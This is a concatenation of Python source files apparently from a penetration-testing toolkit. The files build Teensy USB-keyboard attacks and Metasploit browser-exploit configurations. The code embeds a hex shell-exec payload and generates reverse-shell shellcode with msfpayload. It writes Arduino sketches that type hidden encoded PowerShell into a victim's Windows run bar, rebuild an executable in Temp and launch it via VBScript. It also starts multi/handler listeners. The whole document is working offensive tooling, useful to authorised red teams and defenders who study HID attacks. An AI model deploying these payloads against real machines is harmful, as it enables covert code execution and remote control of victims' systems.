00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010001000000300000800000000000000000040000000000010009040000480000005c70000052010000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010720000ec7100000000000000000000000000001d7200000872000000000000000000000000000000000000000000002872000036720000467200005672000064720000727200000000000080720000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000004578697450726f6365737300000065786974000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
#
#########################################
#
# shell exec payload hex format above
#
#########################################

# print main stuff for the application
print """
********************************************************************
        BSIDES Las Vegas ----  EXE to Teensy Creator
********************************************************************

Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @hackingdave)

This program will take shellexeccode which is converted to hexadecimal and
place it onto a victim machine through hex to binary conversion via powershell.

After the conversion takes place, Alphanumeric shellcode will then be injected
straight into memory and the stager created and shot back to you.
"""

# if we dont detect metasploit
if not os.path.isfile(msf_path): sys.exit("\n[!] Your no gangster... Metasploit not detected, check set_config.\n")

# if we hit here we are good since msfpayload is installed
###################################################
#        USER INPUT: SHOW PAYLOAD MENU 2          #
###################################################

show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
payload=(raw_input(setprompt(["14"], "")))

if payload == "exit" :
    exit_set()

# if its default then select meterpreter
if payload == "" : payload="2"

# assign the right payload
payload=ms_payload(payload)

# if we're downloading and executing a file
url = ""
if payload == "windows/download_exec":
    url = raw_input(setprompt(["6"], "The URL with the payload to download and execute"))
    url = "set URL " + url

# try except for Keyboard Interrupts
try:
    # grab port number
    while 1:
        port = raw_input(setprompt(["6"], "Port to listen on [443]"))
        # assign port if enter is specified
        if port == "": port = 443
        try:
            # try to grab integer port
            port = int(port)
            # if we aren't using a valid port
            if port >= 65535:
                # trigger exception
                port = "dfds"
                port = int(port)
            break

        # if we bomb out then loop through again
        except:
            print "   [!] Not a valid port number, try again."
            # pass through
            pass

# except keyboardintterupts here
except KeyboardInterrupt:
    print """
    .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
    |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
    `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
                                               disabled.\n"""

    sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")

print "   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim..."
# grab msfpayload alphanumeric shellcode to be inserted into shellexec
proc = subprocess.Popen("msfpayload %s EXITFUNC=thread LHOST=%s LPORT=%s %s R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX" % (payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
# read in stdout which will be our alphanumeric shellcode
alpha_payload = proc.stdout.read()
# generate a random filename this is going to be needed to read 150 bytes in at a time
random_filename = generate_random_string(10,15)
# prep a file to write
filewrite = file(random_filename, "wb")
# write the hex to random file
filewrite.write(shell_exec)
# close it
filewrite.close()
# open up the random file
fileopen=file(random_filename, "r")
# base counter will be used for the prog_char RevShell_counter
counter = 0
# space to write out per line in the teensy pde file
space = 50
# rev counter is used for the second writeout
rev_counter = 0
# here we begin the code
output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)*/\n#include <avr/pgmspace.h>\n"

# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))

########################################################################################################################################################################################################
#
# there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
# in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
#
########################################################################################################################################################################################################

# blank command will store our fixed unicode variable
blank_command = ""
# loop through each character and insert null byte
for char in powershell_command:
    # insert the nullbyte
    blank_command += char + "\x00"

# assign powershell command as the new one
powershell_command = blank_command
# base64 encode the powershell command
powershell_command = base64.b64encode(powershell_command)

# while true
while 1:
    # read 150 bytes in at a time
    reading_hex = fileopen.read(space).rstrip()
    # if its blank then break out of loop
    if reading_hex == "": break
    # write out counter and hex
    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_hex)
    # increase counter
    counter = counter +1

# write out the rest
output_variable += "PROGMEM const char *exploit[] = {\n"
# while rev_counter doesn't equal regular counter
while rev_counter != counter:
    output_variable+="RevShell_%s" % rev_counter
    # incremenet counter
    rev_counter = rev_counter + 1
    if rev_counter == counter:
        # if its equal that means we
        # are done and need to append a };
        output_variable+="};\n"
    if rev_counter != counter:
        # if we don't equal, keep going
        output_variable+=",\n"

# vbs filename
vbs = generate_random_string(10,15) + ".vbs"
# .batch filename
bat = generate_random_string(10,15) + ".bat"

# write the rest of the teensy code
output_variable += ("""
char buffer[55];
int ledPin = 11;

void setup() {
  pinMode(ledPin, OUTPUT);
}
void loop()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd /c echo 0 > %%TEMP%%\\\\%s");
  delay(750);
  CommandAtRunBar("notepad %%TEMP%%\\\\%s");
  delay(1000);
  // Delete the 0
  Keyboard.set_key1(KEY_DELETE);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  // Write the binary to the notepad file
  int i;
  for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
    strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
    Keyboard.print(buffer);
    delay(80);
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  delay(5000);
  CtrlS();
  delay(2000);
  AltF4();
  delay(5000);
  // Cannot pass entire encoded command because of the start run length
  // run through cmd
  CommandAtRunBar("cmd");
  delay(1000);
  Keyboard.println("powershell -EncodedCommand %s");
  delay(4000);
  Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %%TEMP%%\\\\%s");
  Keyboard.println("echo WshShell.Run chr(34) ^& \\"%%TEMP%%\\\\%s\\" ^& Chr(34), 0 >> %%TEMP%%\\\\%s");
  Keyboard.println("echo Set WshShell = Nothing >> %%TEMP%%\\\\%s");
  Keyboard.println("echo %%TEMP%%\\\\%s.exe %s > %%TEMP%%\\\\%s");
  Keyboard.println("wscript %%TEMP%%\\\\%s");
  delay(1000);
  Keyboard.println("exit");
  delay(9000000);
}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
void SPRE(int KeyCode){
Keyboard.set_modifier(MODIFIERKEY_SHIFT);
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
# delete temporary file
subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
print "   [*] Binary to Teensy file exported as %s/reports/binary2teensy.pde" % (setdir)
# write the teensy.pde file out
filewrite = file(setdir + "/reports/binary2teensy.pde", "w")
# write the teensy.pde file out
filewrite.write(output_variable)
# close the file
filewrite.close()
print "   [*] Generating a listener..."
# create our metasploit answer file
filewrite = file(setdir + "/answer.txt", "w")
filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
filewrite.close()
# spawn a multi/handler listener
subprocess.Popen("msfconsole -r %s/answer.txt" % (setdir), shell=True).wait()
print "   [*] Housekeeping old files..."
# if our answer file is still there (which it should be), then remove it
if os.path.isfile(setdir + "/answer.txt"):
    # remove the old file, no longer used once we've exited
    subprocess.Popen(setdir + "/answer.txt", shell=True).wait()

########NEW FILE########
__FILENAME__ = powershell_shellcode
#!/usr/bin/python
import pexpect
from src.core.setcore import *

print """
The powershell - shellcode injection leverages powershell to send a meterpreter session straight into memory without ever touching disk.

This technique was introduced by Matthew Graeber (http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html)
"""

# define standard metasploit payload
payload = "windows/meterpreter/reverse_tcp"

# create base metasploit payload to pass to powershell.prep
filewrite = file(setdir + "/metasploit.payload", "w")
filewrite.write(payload)
filewrite.close()

import src.payloads.powershell.prep

fileopen = file(setdir + "/x86.powershell", "r")
#payload_encoded = fileopen.read()

# read in x amount of bytes
data_read = int(50)

output_variable = "#include <avr/pgmspace.h>\n"

counter = 0

while 1:
    reading_encoded = fileopen.read(data_read).rstrip()
    if reading_encoded == "": break
    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_encoded)
    counter = counter + 1

rev_counter = 0
output_variable += "PROGMEM const char *exploit[] = {\n"

while rev_counter != counter:
    output_variable+="RevShell_%s" % rev_counter
    rev_counter = rev_counter +1
    if rev_counter == counter:
        output_variable+="};\n"
    if rev_counter != counter:
        output_variable+=",\n"

teensy = output_variable

# write the rest of the teensy code
teensy+=("""
char buffer[55];
int ledPin = 11;

void setup() {
  pinMode(ledPin, OUTPUT);
}
void loop()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd");
  delay(750);
  Keyboard.print("powershell -nop -win hidden -noni -enc ");
  // Write the binary to the notepad file
  int i;
  for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
    strcpy_P(buffer, (char*)pgm_read_word(&(exploit[i])));
    Keyboard.print(buffer);
    delay(30);
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  //delay(20000);
  //Keyboard.println("exit");
  delay(9000000);
}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
void SPRE(int KeyCode){
Keyboard.set_modifier(MODIFIERKEY_SHIFT);
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
""")
print "[*] Payload has been extracted. Copying file to %s/reports/teensy.pde" % (setdir)
if not os.path.isfile(setdir + "/reports/"):
    os.makedirs(setdir + "/reports/")
filewrite = file(setdir + "/reports/teensy.pde", "w")
filewrite.write(teensy)
filewrite.close()
choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
if choice == "YES":


    # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
        update_options("IPADDR=" + ipaddr)

    if check_options("PORT=") != 0:
        port = check_options("PORT=")

    else:
        port = raw_input("Enter the port to connect back on: ")

    filewrite = file(setdir + "/metasploit.answers", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
    filewrite.close()
    print "[*] Launching Metasploit...."
    try:
        child = pexpect.spawn("msfconsole -r %s/metasploit.answers" % (setdir))
        child.interact()
    except: pass

########NEW FILE########
__FILENAME__ = sd2teensy
#!/usr/bin/python
import binascii,base64,sys,os,random,string,subprocess,socket
from src.core.setcore import *
from src.core.dictionaries import *
from src.core.menu.text import *

################################################################################################
#
#                            BSIDES LV SDCARD to Teensy Creator
#
#                                by Josh Kelley (@winfang98)
#                                Dave Kennedy (@hackingdave)
#
################################################################################################

################################################################################################
################################################################################################

# print main stuff for the application
print """
********************************************************************
        BSIDES Las Vegas ----  SDCard to Teensy Creator
********************************************************************

Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @hackingdave)

This tool will read in a file from the Teensy SDCard, not mount it via
Windows and perform a hex to binary conversion via Powershell. It requires
you to have a Teensy device with a soldered USB device on it and place the
file that this tool outputs in order to successfully complete the task.

It works by reading natively off the SDCard into a buffer space thats then
written out through the keyboard.
"""

# if we hit here we are good since msfpayload is installed
print """
        .-. .-. . . .-. .-. .-. .-. .-.   .  . .-. .-. .-.
        |.. |-| |\| |.. `-.  |  |-  |(    |\/| | | |  )|-
        `-' ` ' ' ` `-' `-'  '  `-' ' '   '  ` `-' `-' `-'
                                                   enabled.\n"""

# grab the path and filename from user
path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
if not os.path.isfile(path):
    while 1:
        print_warning("Filename not found, try again")
        path = raw_input(setprompt(["6"], "Path to the file you want deployed on the teensy SDCard"))
        if os.path.isfile(path): break

print_warning("Note: This will only deliver the payload, you are in charge of creating the listener if applicable.")
print_status("Converting the executable to a hexadecimal form to be converted later...")

fileopen = file(path, "rb")
data = fileopen.read()
data = binascii.hexlify(data)
filewrite = file("converts.txt", "w")
filewrite.write(data)
print "[*] File converted successfully. It has been expored in the working directory under 'converts.txt'. Copy this one file to the teensy SDCard."


output_variable = "/*\nTeensy Hex to File SDCard Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)\nReading from a SD card.  Based on code from: http://arduino.cc/en/Tutorial/DumpFile\n*/\n\n"

# this is used to write out the file
random_filename = generate_random_string(8,15) + ".txt"

# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))

########################################################################################################################################################################################################
#
# there is an odd bug with python unicode, traditional unicode inserts a null byte after each character typically.. python does not so the encodedcommand becomes corrupt
# in order to get around this a null byte is pushed to each string value to fix this and make the encodedcommand work properly
#
########################################################################################################################################################################################################

# blank command will store our fixed unicode variable
blank_command = ""
# loop through each character and insert null byte
for char in powershell_command:
    # insert the nullbyte
    blank_command += char + "\x00"

# assign powershell command as the new one
powershell_command = blank_command
# base64 encode the powershell command
powershell_command = base64.b64encode(powershell_command)

# vbs filename
vbs = generate_random_string(10,15) + ".vbs"
# .batch filename
bat = generate_random_string(10,15) + ".bat"

# write the rest of the teensy code
output_variable += ("""

#include <avr/pgmspace.h>
#include <SD.h>

// Teensy ++ LED is 6.  Teensy the LED is 11.
int ledPin = 6;

void setup()
{
  BlinkFast(2);
  delay(5000);
  CommandAtRunBar("cmd /c echo 0 > %%TEMP%%\\\\%s");
  delay(750);
  CommandAtRunBar("notepad %%TEMP%%\\\\%s");
  delay(1000);
  // Delete the 0
  PRES(KEY_DELETE);
  // This is the SS pin on the Teensy.  Pin 20 on the Teensy ++.  Pin 0 on the Teensy.
  const int chipSelect = 20;

  // make sure that the default chip select pin is set to
  // output, even if you don't use it:
  pinMode(10, OUTPUT);

  // see if the card is present and can be initialized:
  if (!SD.begin(chipSelect)) {
    Keyboard.println("Card failed, or not present");
    // don't do anything more:
    return;
  }

  // open the file. note that only one file can be open at a time,
  // so you have to close this one before opening another.
  // Larger the file, more likely it wouldn't fit in a normal int var.
  // This is the workaround for it.
  long int filePos;
  long int fileSize;
  File dataFile = SD.open("converts.txt");
  if (dataFile) {
    fileSize = dataFile.size();
    for (filePos = 0; filePos <= fileSize; filePos++) {
      Keyboard.print(dataFile.read(),BYTE);
      delay(10);
    }
    dataFile.close();
  }
  else {
    Keyboard.println("error opening converts.txt");
  }
  // ADJUST THIS DELAY IF HEX IS COMING OUT TO FAST!
  delay(5000);
  CtrlS();
  delay(2000);
  AltF4();
  delay(5000);
  // Cannot pass entire encoded command because of the start run length
  // run through cmd
  CommandAtRunBar("cmd");
  delay(1000);
  Keyboard.println("powershell -EncodedCommand %s");
  // Tweak this delay.  Larger files take longer to decode through powershell.
  delay(10000);
  Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %%TEMP%%\\\\%s");
  Keyboard.println("echo WshShell.Run chr(34) ^& \\"%%TEMP%%\\\\%s\\" ^& Chr(34), 0 >> %%TEMP%%\\\\%s");
  Keyboard.println("echo Set WshShell = Nothing >> %%TEMP%%\\\\%s");
  Keyboard.println("echo %%TEMP%%\\\\%s.exe > %%TEMP%%\\\\%s");
  Keyboard.println("wscript %%TEMP%%\\\\%s");
  delay(1000);
  Keyboard.println("exit");
}
void loop () {}
void BlinkFast(int BlinkRate){
  int BlinkCounter=0;
  for(BlinkCounter=0; BlinkCounter!=BlinkRate; BlinkCounter++){
    digitalWrite(ledPin, HIGH);
    delay(80);
    digitalWrite(ledPin, LOW);
    delay(80);
  }
}
void AltF4(){
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_F4);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void CtrlS(){
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.set_key1(KEY_S);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
// Taken from IronGeek
void CommandAtRunBar(char *SomeCommand){
  Keyboard.set_modifier(128);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void PRES(int KeyCode){
Keyboard.set_key1(KeyCode);
Keyboard.send_now();
Keyboard.set_key1(0);
Keyboard.send_now();
}
""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,bat,vbs))
# delete temporary file
subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
print "[*] Binary to Teensy file exported as teensy.pde"
# write the teensy.pde file out
filewrite = file("teensy.pde", "w")
# write the teensy.pde file out
filewrite.write(output_variable)
# close the file
filewrite.close()
print """

Instructions:

Copy the converts.txt file to the sdcard on the Teensy device. Use the teensy.pde normally
and use the Arduino IDE to place the latest code in there. Notice that you need to change
some code marked above based on the Teensy and the Teensy++ based on how you soldered the PIN's
on.

Happy hacking.
"""
return_continue()

########NEW FILE########
__FILENAME__ = teensy
#!/usr/bin/env python
############################
#
# Teensy HID Attack Vector
#
############################
import sys
import re
import os
import subprocess
import datetime
from src.core.setcore import *

# pull metasploit path
msf_path=meta_path()

# check operating system
operating_system = check_os()
now=datetime.datetime.today()
if operating_system != "windows": import pexpect

# check to see if setdir is created
if not os.path.isdir(setdir + "/reports/"):
    os.makedirs(setdir + "/reports/")

definepath=os.getcwd()
# define if use apache or not
apache=0
# open set_config here
apache_check=file("%s/config/set_config" % (definepath),"r").readlines()
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line=line.rstrip()
    # if apache is turned on get things ready
    match=re.search("APACHE_SERVER=ON",line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2=re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2=line2.rstrip()
                apache_path=line2.replace("APACHE_DIRECTORY=","")
                apache=1


# grab info from config file
fileopen=file(setdir + "/teensy", "r")
counter=0
payload_counter=0
for line in fileopen:
    line=line.rstrip()
    if counter == 0:
        choice=str(line)
    if counter == 1:
        payload_counter=1
    counter=counter+1

if choice != "14":
    # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
        update_options("IPADDR=" + ipaddr)

if not os.path.isfile(setdir + "/teensy"):
    print_error("FATAL:Something went wrong, the Teensy config file was not created.")
    exit_set()


def writefile(filename,now):
    fileopen=file("src/teensy/%s" % filename, "r")
    filewrite=file(setdir + "/reports/teensy_%s.pde" % (now), "w")
    for line in fileopen:
        match=re.search("IPADDR",line)
        if match:
            line=line.replace("IPADDR", ipaddr)
        match = re.search("12,12,12,12", line)
        if match:
            ipaddr_replace = ipaddr.replace(".", ",", 4)
            line = line.replace("12,12,12,12", ipaddr_replace)

        filewrite.write(line)
    filewrite.close()

# powershell downloader
if choice == "1":
    writefile("powershell_down.pde", now)

# wscript downloader
if choice == "2":
    writefile("wscript.pde",now)

# powershell reverse
if choice == "3":
    writefile("powershell_reverse.pde",now)

# beef injector
if choice == "4":
    writefile("beef.pde",now)

# java applet downloader
if choice == "5":
    writefile("java_applet.pde",now)

# gnome wget downloader
if choice == "6":
    writefile("gnome_wget.pde",now)

if choice == "13":
    writefile("peensy.pde",now)
    payload_counter = 0

# save our stuff here
print bcolors.BLUE + "\n[*] PDE file created. You can get it under '%s/reports/teensy_%s.pde' " % (setdir,now) +bcolors.ENDC
print bcolors.GREEN + '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' + bcolors.ENDC
print bcolors.RED + "\n[*] If your running into issues with VMWare Fusion and the start menu, uncheck\nthe 'Enable Key Mapping' under preferences in VMWare" + bcolors.ENDC

pause = raw_input("Press {return} to continue.")

if payload_counter == 1:
    if apache == 0:
        subprocess.Popen("mkdir %s/web_clone/;cp %s/msf.exe %s/web_clone/x.exe 1> /dev/null 2> /dev/null" % (setdir,setdir,setdir), shell=True).wait()
        if operating_system != "windows":
            child=pexpect.spawn("python src/html/web_server.py")

    if apache == 1:
        subprocess.Popen("cp %s/msf.exe %s/x.exe" % (setdir,apache_path), shell=True).wait()
    if os.path.isfile(setdir + "/meta_config"):
        print bcolors.BLUE + "\n[*] Launching MSF Listener..."
        print bcolors.BLUE + "[*] This may take a few to load MSF..." + bcolors.ENDC
        try:
            if operating_system != "windows":
                child1=pexpect.spawn("ruby %s/msfconsole -L -r %s/meta_config" % (msf_path,setdir))
                child1.interact()
        except:
            if operating_system != "windows":
                if apache == 0:
                    child.close()
                child1.close()

########NEW FILE########
__FILENAME__ = gen_payload
#!/usr/bin/env python
# This module is for the metasploit browser exploits
import re
import os
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *

definepath=os.getcwd()
me = mod_name()
port = ""

# see if multi_attack is being used and prep everything we need
multiattack="off"
webdav_enabled="off"
if os.path.isfile(setdir + "/multi_payload"):
    multiattack="on"
    # just need a simple filewrite to generate a file if webdav is enabled
    # this is used for multi attack, it will write out file to program junk
    # then a simple check will determine if webdav is enabled for the port
    webdav_enabled="off"
    webdav_write=file(setdir + "/webdav_enabled","w")

    fileopen=file(setdir + "/multi_payload", "r")
    for line in fileopen:
        match=re.search("MAIN=",line)
        if match:
            port=line.replace("MAIN=","")
        match2=re.search("MAINPAYLOAD=",line)
        if match2:
            exploit=line.replace("MAINPAYLOAD=",line)

# grab metasploit path
metasploit_iframe="8080"

msf_path = meta_path()

configfile=file("%s/config/set_config" % (definepath),"r").readlines()
for line in configfile:
    line=line.rstrip()

    match4=re.search("METERPRETER_MULTI_SCRIPT=", line)
    if match4:
        meterpreter_multi=line.replace("METERPRETER_MULTI_SCRIPT=", "")


    match5=re.search("METERPRETER_MULTI_COMMANDS=", line)
    if match5:
        meterpreter_multi_command=line.replace("METERPRETER_MULTI_COMMANDS=", "")
        meterpreter_multi_command=meterpreter_multi_command.replace(";", "\n")

    match6=re.search("METASPLOIT_IFRAME_PORT=", line)
    if match6:
        metasploit_iframe=line.replace("METASPLOIT_IFRAME_PORT=", "")

    match7=re.search("AUTO_MIGRATE=", line)
    if match7:
        auto_migrate=line.replace("AUTO_MIGRATE=", "")

# grab attack vector
attack_vector=""
if os.path.isfile(setdir + "/attack_vector"):
    fileopen=file(setdir + "/attack_vector")
    for line in fileopen:
        attack_vector=line.rstrip()

# open ipaddr
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = raw_input("Enter your ipaddress: ")
    update_options("IPADDR=" + ipaddr)

debug_msg(me,"printing 'text.browser_exploits_menu'",5)
show_browserexploit_menu = create_menu(browser_exploits_text, browser_exploits_menu)
exploit=raw_input(setprompt(["4"], ""))

if exploit == '':
    print "\n   Defaulting to IE CSS Import Use After Free exploit....."
    exploit=("1")

# dictionary = ms_module
exploit = ms_module(exploit)

choice1=""

if multiattack == "off":
    if exploit != "windows/browser/java_codebase_trust":
        show_payload_menu_2 = create_menu(payload_menu_2_text, payload_menu_2)
        choice1=raw_input(setprompt(["4"], ""))

if choice1 == '':choice1 ='2'

choice1 = ms_payload(choice1)

# if we are using the java exploit
if exploit == "exploit/windows/browser/java_codebase_trust" or exploit == "exploit/multi/browser/java_atomicreferencearray" or exploit == "exploit/multi/browser/java_verifier_field_access" or exploit == "exploit/multi/browser/java_jre17_exec" or exploit == "exploit/multi/browser/java_jre17_jmxbean" or exploit == "exploit/multi/browser/java_jre17_jmxbean_2":
    print "[*] Selecting Java Meterpreter as payload since it is exploit specific."
    choice1 = ("java/meterpreter/reverse_tcp")

if multiattack == "off":
    port=raw_input(setprompt(["4"], "Port to use for the reverse [443]"))
    if port == "": port = "443"

# check to see if we need to use the multi attack vector in java
if not os.path.isfile(setdir + "/multi_java"):
    filewrite=file(setdir + "/meta_config", "w")
if os.path.isfile(setdir + "/multi_java"):
    filewrite=file(setdir + "/meta_config", "a")

filewrite.write("use "+exploit+"\n")
filewrite.write("set PAYLOAD "+choice1+"\n")
filewrite.write("set LHOST "+ipaddr+"\n")
filewrite.write("set LPORT %s" % (port) + "\n")
#filewrite.write("set ENCODING shikata_ga_nai"+"\n")
filewrite.write("set URIPATH /"+"\n")
if choice1 == ("windows/download_exec"):
    print "You selected the download and execute payload. Enter the URL to your executable."
